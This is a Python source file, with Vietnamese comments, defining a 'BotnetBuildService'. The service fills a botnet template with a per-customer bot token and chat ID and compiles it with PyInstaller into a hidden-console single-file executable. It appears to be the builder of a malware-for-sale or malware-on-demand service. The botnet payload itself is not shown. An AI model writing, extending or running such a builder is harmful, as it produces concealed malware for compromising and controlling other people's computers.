import os
import shutil
import tempfile
import subprocess
import asyncio

class BotnetBuildService:
    def __init__(self, botnet_dir='product/botnet', pyinstaller_path='pyinstaller'):
        self.botnet_dir = botnet_dir
        self.pyinstaller_path = pyinstaller_path

    async def build_botnet_exe(self, output_dir: str = 'build/botnet', token: str = None, chat_id: str = None) -> str:
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            None,
            self._build_sync,
            output_dir, token, chat_id
        )

    def _build_sync(self, output_dir, token, chat_id):
        os.makedirs(output_dir, exist_ok=True)
        # Đặt tên file exe theo chat_id và token (rút gọn)
        token_short = (token or '')[:8].replace(':', '').replace('-', '')
        chat_id_str = str(chat_id or '').replace('-', '')
        exe_name = f'botnet_{chat_id_str}_{token_short}.exe' if os.name == 'nt' else f'botnet_{chat_id_str}_{token_short}'
        exe_path = os.path.join(output_dir, exe_name)
        if os.path.exists(exe_path):
            return exe_path
        template_path = os.path.join(self.botnet_dir, 'main.py')
        with open(template_path, 'r', encoding='utf-8') as f:
            code = f.read()
        # Thay thế token/chat_id
        code = code.replace('{TOKEN}', token or '').replace('{CHAT_ID}', str(chat_id or ''))
        with tempfile.TemporaryDirectory() as tmpdir:
            main_path = os.path.join(tmpdir, 'main.py')
            with open(main_path, 'w', encoding='utf-8') as f:
                f.write(code)
            # Thêm --add-data để đóng gói thư mục utils
            utils_src = os.path.join(self.botnet_dir, 'utils')
            sep = ';' if os.name == 'nt' else ':'
            add_data_arg = f"{utils_src}{sep}utils"
            # Dùng --name để build ra file exe đúng tên mong muốn
            cmd = [
                self.pyinstaller_path,
                '--onefile',
                '--noconsole',
                '--distpath', output_dir,
                '--add-data', add_data_arg,
                '--name', exe_name.replace('.exe', '') if os.name == 'nt' else exe_name,
                main_path
            ]
            subprocess.run(cmd, check=True)
            return exe_path